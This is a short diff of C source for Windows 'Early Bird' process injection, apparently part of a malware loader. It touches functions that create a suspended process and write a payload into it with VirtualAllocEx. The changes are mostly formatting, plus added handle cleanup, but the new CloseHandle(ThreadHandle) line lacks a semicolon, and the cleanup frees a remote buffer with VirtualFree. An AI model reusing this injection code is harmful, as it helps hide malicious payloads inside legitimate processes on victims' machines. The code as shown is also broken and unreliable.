@@ -9,8 +9,8 @@ BOOL CreateSuspendedProcess
 )
 {
 
-	STARTUPINFOW si = { 0 };
-	PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFOW		si			= { 0 };
+	PROCESS_INFORMATION pi			= { 0 };
 
 	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
 	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
@@ -46,10 +46,10 @@ BOOL WritePayloadViaEarlyBirdInjection
 )
 {
 
-	BOOL State = TRUE;
-	PVOID PayloadBuffer = NULL;
-	DWORD dwOldProtection = 0;
-	SIZE_T BytesWritten = 0;
+	BOOL		State			= TRUE;
+	PVOID		PayloadBuffer	= NULL;
+	DWORD		dwOldProtection = 0;
+	SIZE_T		BytesWritten	= 0;
 
 	if (!(PayloadBuffer = VirtualAllocEx(ProcessHandle, NULL, PayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) || PayloadBuffer == NULL)
 	{
@@ -106,8 +106,11 @@ BOOL WritePayloadViaEarlyBirdInjection
 
 _END_FUNC:
 
-	if (ProcessHandle)
+	if (ProcessHandle != NULL)
 		CloseHandle(ProcessHandle);
+
+	if (ThreadHandle != NULL)
+		CloseHandle(ThreadHandle)
 
 	if (PayloadBuffer)
 		VirtualFree(PayloadBuffer, 0, MEM_RELEASE);
